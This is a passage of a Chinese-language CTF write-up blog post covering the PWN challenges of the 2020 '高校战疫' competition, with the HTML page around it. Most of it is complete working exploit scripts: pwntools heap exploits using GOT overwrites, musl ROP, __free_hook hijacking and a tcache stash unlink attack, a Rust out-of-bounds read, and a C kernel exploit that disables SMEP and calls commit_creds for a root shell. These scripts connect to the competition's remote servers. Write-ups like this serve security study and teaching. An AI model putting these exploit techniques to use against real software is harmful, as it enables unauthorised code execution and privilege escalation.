+    sla(&quot;: &quot;, str(station_numb))
+
+    for i in range(station_numb):
+        sla(&quot;: &quot;, str(connected_id[i]))
+        sla(&quot;: &quot;, str(connected_distance[i]))
+
+
+def free(id):
+    choose(2)
+    sla(&quot;: &quot;, str(id))
+
+
+cmd = &quot;set $a=0x604360\n&quot;
+cmd +=&quot;set $b=0x602720\n&quot;
+cmd +=&quot;set $c=0x605620\n&quot;
+cmd +=&quot;set $d=0x603A00\n&quot;
+cmd += &quot;set $h=0x0603D20\n&quot;
+#debug(cmd)
+
+
+add(0, 0xff, 0xff, &#39;aaa&#39;, 1, [1, 4, 3, 7], [0x66, 0x77, 0x88, 0xff])
+add(1, 0xff, 0xff, &#39;a&#39;*(0x240-0x160), 1, [1, 4, 3, 7], [0x66, 0x77, 0x88, 0xff])
+add(2, 0xff, 0xff, &#39;a&#39;, 1, [1, 4, 3, 7], [0x66, 0x77, 0x88, 0xff])
+
+choose(3)
+sla(&quot;: &quot;, &quot;1&quot;)
+
+p.interactive()</code></pre>
+<blockquote>
+<p>flag{SPFA_1s_4_9o0d_A1gorithm}</p>
+</blockquote>
+<h2 id="kenoob"><a href="#kenoob" class="headerlink" title="kenoob"></a>kenoob</h2><p>文件解包之后，发现fs文件夹下有flag233：</p>
+<blockquote>
+<p>flag{b4by_b4by_r4c3_c0nd1710n}</p>
+</blockquote>
+<h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>没啥意思，读写的idx可以输入负值，找到存有got地址的位置，然后读写got:</p>
+<pre><code class="python">#-*- coding: utf-8 -*-
+#
+# @Author : t1an5t
+#
+from pwn_debug import *
+
+ELF_PATH = &quot;./hw&quot; 
+LIBC_PATH = &quot;./libc.so.6&quot;
+LIBC_VERSION = &quot;2.29&quot;
+LD_PATH = &quot;/glibc/x64/{}/lib/ld-{}.so&quot;.format(LIBC_VERSION, LIBC_VERSION)
+
+IP = &quot;121.37.167.199&quot;
+PORT = 9997
+
+# input argv[1] = 1/2/3 corresponding to local/debug/remote run mode
+MODE = [&quot;&quot;, &quot;local&quot;, &quot;debug&quot;, &quot;remote&quot;][int(sys.argv[1])]
+
+pd = pwn_debug(ELF_PATH)
+pd.context.terminal=[&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+pd.context.log_level = &quot;debug&quot;
+
+pd.local(LIBC_PATH, LD_PATH)
+pd.debug(LIBC_VERSION)
+pd.remote(IP, PORT)
+
+p = pd.run(MODE)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def choose(idx):
+    sla(&quot;&gt;&quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sla(&quot;:\n&quot;, str(sz))
+    sa(&quot;:\n&quot;, ctx)
+
+def edit(idx, ctx):
+    choose(2)
+    sla(&quot;:\n&quot;, str(idx))
+    sa(&quot;:\n&quot;, ctx)
+
+def free(idx):
+    choose(3)
+    sla(&quot;\n&quot;, str(idx))
+
+def show(idx):
+    choose(4)
+    sla(&quot;\n&quot;, str(idx))
+
+pd.bp(watch=[0x404140, 0x4040e0], command=[], address_list=[0x0401417])
+
+libc = ELF(LIBC_PATH)
+
+add(0x30, &quot;/bin/sh\x00&quot;)
+
+show(-1876)
+lb = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8, &quot;\x00&quot;))-libc.sym[&#39;putchar&#39;]
+success(hex(lb))
+
+edit(-1879, p64(lb+libc.sym[&quot;system&quot;]))
+
+choose(5)
+
+p.interactive()
+</code></pre>
+<blockquote>
+<p>flag{h0mew0rksysysykkkttt!}</p>
+</blockquote>
+<h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>泄露很容易，有了libc地址相当于有了堆地址，mmap偏移是固定的，利用信息堆块里的size，错位伪造一下，砸到信息堆块那里，然后就可以任意地址读写了。这里因为musl没有hook函数，所以通过libc的env泄露栈然后写ROP：</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#context.log_level=&quot;debug&quot;
+
+#p = process(&quot;./pwn&quot;, env={&quot;LD_PRELOAD&quot;:&quot;./libc.so&quot;})
+# proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+
+p = remote(&quot;119.3.158.103&quot;, 19008)
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def choose(idx):
+    sla(&quot;&gt; &quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sla(&quot;&gt;&quot;, str(sz))
+    sla(&quot;&gt;&quot;, &quot;n&quot;)
+    sa(&quot;&gt;&quot;, ctx)
+
+def add_over(sz, ctx):
+    choose(1)
+    sla(&quot;&gt;&quot;, str(sz))
+    sla(&quot;&gt;&quot;, &quot;Y&quot;)
+    sa(&quot;&gt;&quot;, ctx)
+
+def free(idx):
+    choose(2)
+    sla(&quot;&gt;&quot;, str(idx))
+
+def edit(idx, ctx):
+    choose(3)
+    sla(&quot;&gt;&quot;, str(idx))
+    sn(ctx)
+
+def show(idx):
+    choose(4)
+    sla(&quot;&gt;&quot;, str(idx))
+
+def debug(cmd=&quot;&quot;):
+    gdb.attach(p, cmd)
+
+cmd = &quot;set $a=%d\n&quot;%(0x7ffff7ff4000)
+#cmd += &quot;set $b=%d\n&quot;%(0x7ffff7ff4000)
+cmd += &quot;set $b=%d\n&quot;%(0x7ffff7ffbac0)
+#debug(cmd)
+
+add(1, &quot;a&quot;)
+show(0)
+lb = u64(ru(&quot;\x7f&quot;).ljust(8, &quot;\x00&quot;))-0x292e61
+success(hex(lb))
+
+#info = lb + 0x28b000
+info = lb + 0x290000
+env = lb + 2707416
+system = lb + 0x42688
+bin_sh = lb + 0x91345
+p_rdi = lb+0x14862
+
+add(0x40,&#39;a&#39;*0x40) # 1 
+add(0x10,&#39;a&#39;*0x10) # 2
+add(0x30,&#39;A&#39;*0x30) # 3  
+add(0x10,&#39;A&#39;*0x10) # 4 
+add(0x30,&#39;A&#39;*0x30) # 5   
+add(0x10,&#39;A&#39;*0x10) # 6
+
+free(3)
+free(5)
+free(1)
+
+p1=&#39;A&#39;*0x70+p64(0x21)+p64(0x40)
+p1 += p64(info+8)[:6]+&#39;\n&#39;
+add_over(0x40,p1)#1
+
+add(0x30,&#39;A&#39;*0x30) # 3
+
+p2 = p64(0x602034) # show time
+p2 += p64(0x30)+p64(env) # 2
+
+add(0x30, p2+&#39;\n&#39;)
+
+edit(1, p32(0)+&quot;\n&quot;)
+show(2)
+
+stack = u64(ru(&quot;Done.&quot;)[:-5].ljust(8, &quot;\x00&quot;))    
+success(hex(stack))
+
+ret = stack-0x70
+p3 = p64(0x602034) + p64(0x80) + p64(ret)+&#39;\n&#39;
+edit(5, p3)
+
+#cmd = &quot;b *0x400F80\n&quot;
+#debug(cmd)
+
+p4 = flat(p_rdi, bin_sh, system)
+edit(2, p4+&quot;\n&quot;)
+
+p.interactive()</code></pre>
+<blockquote>
+<p>flag{It_1s_n0t_0ur_3nemi3s_that_def3at_us_It_1s_0ur_f3ar_POE}</p>
+</blockquote>
+<h2 id="babykernel"><a href="#babykernel" class="headerlink" title="babykernel"></a>babykernel</h2><p>解包后直接就有flag，cat flag即可：</p>
+<blockquote>
+<p>flag{B4by_k3rler_1s_such_2_3aby!!!!!!!!!!!!!!} </p>
+</blockquote>
+<h2 id="babykernel2"><a href="#babykernel2" class="headerlink" title="babykernel2"></a>babykernel2</h2><p>上一题被偷了之后的正规版，其实就是模板套路型kernel题，越界读写，泄露canary然后做ROP来拿root，随便找个模板改改都能做。最后因为远程qemu脚本只有15s很容易崩，所以用musl-gcc编译然后再打包上传压缩程序大小。</p>
+<pre><code class="c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;sys/ioctl.h&gt;
+
+//musl-gcc -static -s exp.c
+unsigned long long cs,ss,rsp,rflags;
+unsigned long long canary;
+unsigned long long  vmlinux_base = 0xffffffff81000000;
+unsigned long long  kernel_base ;
+unsigned long long  prepare_kernel_cred;
+unsigned long long  commit_creds;
+
+void get_state()
+{
+    __asm__(
+        &quot;mov %%cs,%0;&quot;
+        &quot;mov %%ss,%1;&quot;
+        &quot;mov %%rsp,%2;&quot;
+        &quot;pushfq;&quot;
+        &quot;popq %3;&quot;
+        :&quot;=r&quot;(cs),&quot;=r&quot;(ss),&quot;=r&quot;(rsp),&quot;=r&quot;(rflags)
+        :
+        :&quot;memory&quot;
+    );
+}
+
+void set_size(int fd, int size)
+{
+    ioctl(fd, 0x30000, size);
+}
+
+void oob_read(int fd, char* buf)
+{
+    ioctl(fd, 0x30002, buf);
+}
+
+void oob_write(int fd, char* buf)
+{
+    ioctl(fd, 0x30001, buf);
+}
+
+void root()
+{
+    char * (*pkc)(int) = prepare_kernel_cred;
+    void (*cc)(char*) = commit_creds;
+    (*cc)((*pkc)(0));
+}
+
+
+void getshell()
+{
+    system(&quot;/bin/sh&quot;);
+}
+
+
+int main()
+{
+    get_state();
+    char *buf = (char*)malloc(0x10000);
+    int fd = open(&quot;/dev/babyhacker&quot;, 0);
+
+    set_size(fd, -0xf000);
+    oob_read(fd, buf);
+
+    canary = *(unsigned long long*)(buf+40);
+
+    unsigned long long leak = *(unsigned long long*)(buf+0xe8);
+    kernel_base = leak - 0x11be05d+0x1000000;
+
+    unsigned long long  pop_rdi_ret = kernel_base+0xffffffff8109054d-vmlinux_base;    
+    unsigned long long  mov_cr4_rdi_pop_rbp_ret = 0xffffffff81004d70+kernel_base-vmlinux_base;
+    unsigned long long swapgs_pop_rbp_ret = 0xffffffff810636b4+kernel_base-vmlinux_base;
+    unsigned long long iretq = 0xffffffff8168b278+kernel_base-vmlinux_base;
+
+    prepare_kernel_cred = kernel_base+0xffffffff810a1820-vmlinux_base;
+    commit_creds = kernel_base+0xffffffff810a1430-vmlinux_base;
+
+    unsigned long long* rop = (unsigned long long* )malloc(0x800);
+
+    int i = 40;
+    rop[i++] = canary;
+    rop[i++] = 0;
+    rop[i++] = pop_rdi_ret;
+    rop[i++] = 0x6f0;
+    rop[i++] = mov_cr4_rdi_pop_rbp_ret;
+    rop[i++] = 0;
+    rop[i++] = root;
+    rop[i++] = swapgs_pop_rbp_ret;
+    rop[i++] = 0;
+    rop[i++] = iretq;
+    rop[i++] = getshell;
+    rop[i++] = cs;
+    rop[i++] = rflags;
+    rop[i++] = rsp;
+    rop[i++] = ss;
+
+    oob_write(fd,rop);
+
+}</code></pre>
+<blockquote>
+<p>flag{B4by_k3rler_1s_such_2_3aby!a24d3df5645ff}</p>
+</blockquote>
+<h2 id="rustpad"><a href="#rustpad" class="headerlink" title="rustpad"></a>rustpad</h2><p>根据提示关键字找到了类似的脚本。</p>
+<p><a href="https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/80193b18b76822cb1eb1661e91961e11e1641855/hacklu_2018/rustycodepad/exploit_rustycodepad.rs" target="_blank" rel="noopener">https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/80193b18b76822cb1eb1661e91961e11e1641855/hacklu_2018/rustycodepad/exploit_rustycodepad.rs</a></p>
+<p>利用该bug可以越界读写到ELF文件的内容，同时本地测试发现flag是被写在ELF的数据段里的，所以站在巨人肩膀上，魔改一下代码，越界给flag读出来。</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level=&quot;debug&quot;
+
+#p = process(&quot;/pwn/pwn&quot;)
+#proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+
+p = remote(&quot;159.138.4.209&quot;, 1001)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+p1 = &#39;&#39;&#39;
+static UNIT: &amp;&#39;static &amp;&#39;static () = &amp;&amp;();
+fn foo&lt;&#39;a, &#39;b, T&gt;(_: &amp;&#39;a &amp;&#39;b (), v: &amp;&#39;b T) -&gt; &amp;&#39;a T { v }
+
+fn bad&lt;&#39;a, T&gt;(x: &amp;&#39;a T) -&gt; &amp;&#39;static T {
+    let f: fn(_, &amp;&#39;a T) -&gt; &amp;&#39;static T = foo;
+    f(UNIT, x)
+}
+
+fn endianswap(x: u32) -&gt; u32 {
+    (x &amp; 0xff000000) &gt;&gt; 24 |
+    (x &amp; 0x00ff0000) &gt;&gt; 08 |
+    (x &amp; 0x0000ff00) &lt;&lt; 08 |
+    (x &amp; 0x000000ff) &lt;&lt; 24
+}
+
+pub fn code() {
+    println!(&quot;reached 1&quot;);
+
+    fn inner() -&gt; &amp;&#39;static Vec&lt;u8&gt; {
+        let x = Box::new(Vec::new());
+        bad(&amp;*x)
+    }
+
+    let x = inner();
+    let mut y = Box::new((1usize, 2usize, 3usize));
+    println!(&quot;x: {:?} {} {}&quot;, x.as_ptr(), x.capacity(), x.len());
+
+    let mut r = |addr: usize| { y.0 = addr; x[0] };
+    let r32 = |r: &amp;mut FnMut(usize) -&gt; u8, x: usize| {
+        let mut tmp = 0u32;
+        for j in 0..4 {
+            tmp |= (r(x+3-j) as u32) &lt;&lt; (8 * j);
+        }
+        tmp
+    };
+
+    let mut i: usize = &amp;code as *const _ as _;
+    println!(&quot;code start: {:x}&quot;, i);
+
+    for j in 0..14 {
+         let tmp = r32(&amp;mut r, i) as u32;
+         println!(&quot;flag: {:x}&quot;, tmp);
+         println!(&quot;{}&quot;, j);
+         i -= 4;
+     }
+
+}
+
+&#39;&#39;&#39;
+
+p1 = p1.replace(&quot;\n&quot;, &quot;&quot;)
+#p1 = &#39;aaa&#39;
+p.sendlineafter(&quot;thought?\n&quot;, p1)
+
+p.interactive()</code></pre>
+<blockquote>
+<p>flag{2c9a594f-6e42-44e3-9767-fffc7deb0c32}</p>
+</blockquote>
+<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>是个虚拟机，没看，学弟的脚本：</p>
+<pre><code class="python">#!/usr/bin/python
+from pwn import *
+import os
+# context.terminal = [&quot;tmux&quot;, &#39;splitw&#39;, &#39;-h&#39;]
+context.terminal = [&quot;terminator&quot;, &quot;-x&quot;, &quot;sh&quot;, &quot;-c&quot;]
+challengename = &quot;EasyVM&quot;
+libcversion = &#39;2.23&#39;
+IP = &quot;121.36.215.224&quot;
+PORT = 9999
+elfpath = os.path.join(os.getcwd(), challengename)
+print(elfpath)
+elf = ELF(elfpath, checksec=False)
+context.arch = elf.arch
+if context.arch == &quot;amd64&quot;:
+    libc = ELF(&quot;/glibc/x64/{}/lib/libc-{}.so&quot;.format(libcversion, libcversion), checksec=False)
+else:
+    libc = ELF(&quot;/glibc/x86/{}/lib/libc-{}.so&quot;.format(libcversion, libcversion), checksec=False)
+
+
+remote_ = 1
+if remote_ == 1:
+    io = remote(IP, PORT)    
+    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)
+else:
+    if context.arch == &quot;amd64&quot;:
+        argv = [
+            &#39;/glibc/x64/{}/lib/ld-{}.so&#39;.format(libcversion, libcversion), 
+            &#39;--library-path&#39;, 
+            &#39;/glibc/x64/{}/lib/&#39;.format(libcversion), 
+            &#39;./&#39; + challengename
+        ]
+    else:
+        argv = [
+            &#39;/glibc/x86/{}/lib/ld-{}.so&#39;.format(libcversion, libcversion), 
+            &#39;--library-path&#39;, 
+            &#39;/glibc/x86/{}/lib/&#39;.format(libcversion), 
+            &#39;./&#39; + challengename
+        ]
+    print(argv)
+    io = process(argv=argv, aslr=1)
+    base = io.libs()[elfpath]
+    cmd = &quot;&quot;&quot;b *0x{:x}
+    set $base=0x{:x}&quot;&quot;&quot;.format(base + 0xCAC, base)
+
+
+def show_leak(name, leak):
+    success(&quot;{} ====&gt; 0x{:x}&quot;.format(name, leak))
+
+def debug_func():
+    gdb.attach(io, cmd)
+
+
+ru = lambda x: io.recvuntil(x)
+se = lambda x: io.send(x)
+sea= lambda x, y: io.sendafter(x, y)
+sl = lambda x: io.sendline(x)
+sla= lambda x, y: io.sendlineafter(x, y)
+
+
+# gdb.attach(io, cmd)
+# pause()
+def wcode(code):
+    sla(&quot;&gt;&gt;&gt; \n&quot;, &quot;1&quot;)
+    se(code)
+
+
+def run():
+    sla(&quot;&gt;&gt;&gt; \n&quot;, &quot;2&quot;)
+
+
+def free():
+    sla(&quot;&gt;&gt;&gt; \n&quot;, &quot;3&quot;)
+
+
+def backdoor():
+    sla(&quot;&gt;&gt;&gt; \n&quot;, &quot;4&quot;)
+# free()
+# sla(&quot;&gt;&gt;&gt; \n&quot;, &quot;4&quot;)
+# run()
+
+
+backdoor()
+payload = p8(9) + p8(0x11) + p8(0x99)
+wcode(payload)
+run()
+piebase = eval(io.recvline().strip()) - 0x6c0
+show_leak(&quot;piebase&quot;, piebase)
+payload  = &quot;&quot;
+payload += p8(0x80) + p8(0x3) + p32(piebase + elf.got[&#39;atoi&#39;]  ) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(piebase + elf.got[&#39;atoi&#39;]+1) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(piebase + elf.got[&#39;atoi&#39;]+2) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(piebase + elf.got[&#39;atoi&#39;]+3) + p16(0x53)
+payload += p8(0x99)
+wcode(payload)
+run()
+libc.address = ( u8(io.recv(1)) + (u8(io.recv(1)) &lt;&lt; 8) + (u8(io.recv(1)) &lt;&lt; 16) + (u8(io.recv(1)) &lt;&lt; 24) ) - libc.sym[&#39;atoi&#39;]
+# libc.address = u32(io.recv(4)) - libc.sym[&#39;atoi&#39;]
+show_leak(&quot;libc&quot;, libc.address)
+
+payload  = &quot;&quot;
+payload += p8(0x80) + p8(0x3) + p32(libc.sym[&#39;__free_hook&#39;]  ) + p16(0x54)
+payload += p8(0x80) + p8(0x3) + p32(libc.sym[&#39;__free_hook&#39;]+1) + p16(0x54)
+payload += p8(0x80) + p8(0x3) + p32(libc.sym[&#39;__free_hook&#39;]+2) + p16(0x54)
+payload += p8(0x80) + p8(0x3) + p32(libc.sym[&#39;__free_hook&#39;]+3) + p16(0x54)
+payload += p8(0x71) + &quot;/sh\x00&quot;
+payload += p8(0x71) + &quot;/bin&quot;
+payload += p8(0x99)
+
+wcode(payload)
+run()
+se(p8(libc.sym[&#39;system&#39;]&amp;0xFF))
+se(p8((libc.sym[&#39;system&#39;]&amp;0xFF00)&gt;&gt;8))
+se(p8((libc.sym[&#39;system&#39;]&amp;0xFF0000)&gt;&gt;16))
+se(p8((libc.sym[&#39;system&#39;]&amp;0xFF000000)&gt;&gt;24))
+
+main_arena = 0x1b2780
+payload  = &quot;&quot;
+payload += p8(0x80) + p8(0x3) + p32(libc.address+main_arena+48  ) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(libc.address+main_arena+48+1) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(libc.address+main_arena+48+2) + p16(0x53)
+payload += p8(0x80) + p8(0x3) + p32(libc.address+main_arena+48+3) + p16(0x53)
+payload += p8(0x99)
+wcode(payload)
+run()
+
+heap = ( u8(io.recv(1)) + (u8(io.recv(1)) &lt;&lt; 8) + (u8(io.recv(1)) &lt;&lt; 16) + (u8(io.recv(1)) &lt;&lt; 24) ) - 0xda8
+show_leak(&quot;heap&quot;, heap)
+
+payload  = &quot;&quot;
+payload += p8(0x80) + p8(10) + p32(heap+0x17c) + p8(0x99)
+wcode(payload)
+run()
+# debug_func()
+free()
+io.interactive()
+io.close()</code></pre>
+<h2 id="easy-unicorn"><a href="#easy-unicorn" class="headerlink" title="easy_unicorn"></a>easy_unicorn</h2><p>感觉程序写得很厉害，甘拜下风，实在是不会逆。根据里面的字符串推断，逆过来之后，输入password之后，应该是个简单的ORW的shellcode把。可惜分析了好久也不知道如何把真实逻辑dump出来，遂放弃。</p>
+<h2 id="twochunk"><a href="#twochunk" class="headerlink" title="twochunk"></a>twochunk</h2><p>这个是我出的题目，利用基于tcache stash unlink attack技术的升级版，我称之为 tcache stash unlink attack plus。有兴趣可以看一下HITCON-2019-lazyhouse这道题目的官方解法，再稍稍变通一下。</p>
+<p>简单来说，利用申请smallbin的时候出发的stash机制，smallbin里剩余的chunk会被放到对应size的tcache中，仔细构造后，可以<strong>同时实现任意地址分配以及任意地址写libc值的效果</strong>。</p>
+<p>利用add里唯一一次malloc来从tcache里拿chunk，然后利用唯一一次show泄露这个堆地址。之后唯一一次堆溢出，构造smallbin的stash布局，分配到Addr地址的chunk，同时在初始的时候对Addr里的数据构造一下，就可以把libc地址砸到Addr里，用show_msg泄露libc，然后通过edit_msg功能拿到stash后的Addr的堆块，写成system和bin_sh，最后触发后门getshell。</p>
+<p>我的exp偏移值是有一些问题的，不过重点是操作嘛hh：</p>
+<pre><code class="python">#-*- coding: utf-8 -*
+#
+# @Author : t1an5t
+#
+from pwn import *
+context.log_level = &quot;debug&quot;
+
+p = process(&quot;./pwn&quot;)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def choose(idx):
+    sla(&quot;: &quot;, str(idx))
+
+def add(idx, sz):
+    choose(1)
+    sla(&quot;idx: &quot;, str(idx))
+    sla(&quot;size: &quot;, str(sz))
+
+def free(idx):
+    choose(2)
+    sla(&quot;idx: &quot;, str(idx))
+
+def show(idx):
+    choose(3)
+    sla(&quot;idx: &quot;, str(idx))
+
+def edit(idx, ctx):
+    choose(4)
+    sla(&quot;idx: &quot;, str(idx))
+    sa(&quot;content: &quot;, ctx)
+
+#pd.bp(watch=[0x40a0], command=[], address_list=[0x17b5])
+
+sa(&quot;name: &quot;, p64(0x23333020)*6)
+sa(&quot;message: &quot;, &quot;aaa&quot;)
+
+# fill tcache with 5 chunks
+for i in range(5):
+    add(0, 0x88)
+    free(0)
+
+# leak heap
+add(0, 233)
+free(0)
+add(0, 233)
+free(0)
+add(0, 23333)
+show(0)
+heap = u64(rv(6).ljust(8, &quot;\x00&quot;))-0x530
+success(hex(heap))
+
+free(0)
+
+# fill in tcache
+for i in range(7):
+    add(0, 0x188)
+    free(0)
+
+add(0, 0x188)
+add(1, 0x300) # padding
+free(0) # unsortedbin
+add(0, 0xf8)
+free(0)
+add(0, 0x100) # smallbin
+
+free(0)
+free(1)
+
+add(0, 0x188)
+add(1, 0x300) # padding
+free(0) # unsortedbin
+free(1)
+
+add(0, 0xf8) # overwrite
+add(1, 0x100) # smallbin
+free(1)
+
+# overwrite
+p1 = &quot;\x00&quot;*0xf0 + flat(0, 0x91, heap+0x1310, 0x23333000-0x10)
+edit(0, p1)
+
+# trigger smallbin stash unlink attack
+add(1, 0x88)
+
+# leak libc
+choose(5)
+libc_base = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8, &quot;\x00&quot;)) -0x3b2d20
+success(hex(libc_base))
+
+# overwrite name and message
+choose(6)
+system = libc_base+0x41c20
+p2 = p64(system) + &quot;/bin/sh\x00&quot;+p64(0)*4+p64(0x23333008)+p64(0)*2
+sla(&quot;: &quot;, p2)
+
+# getshell
+choose(7)
+
+p.interactive()</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1037178204@qq.com </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>2020-高校战疫-writeup-PWN</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="t1an5t">t1an5t</a></p>
+    <p><span class="copy-title">发布时间:</span>2020-03-09, 22:22:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-09, 22:28:45</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020-高校战疫-writeup-PWN/" title="2020-高校战疫-writeup-PWN">http://tianstcht.github.io/2020-高校战疫-writeup-PWN/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2019-2020 t1an5t</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#ctf','#pwnable','#2019','#reverse','#writeup','#qemu','#elf','#kernel','#pwntools','#glibc','#tw',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
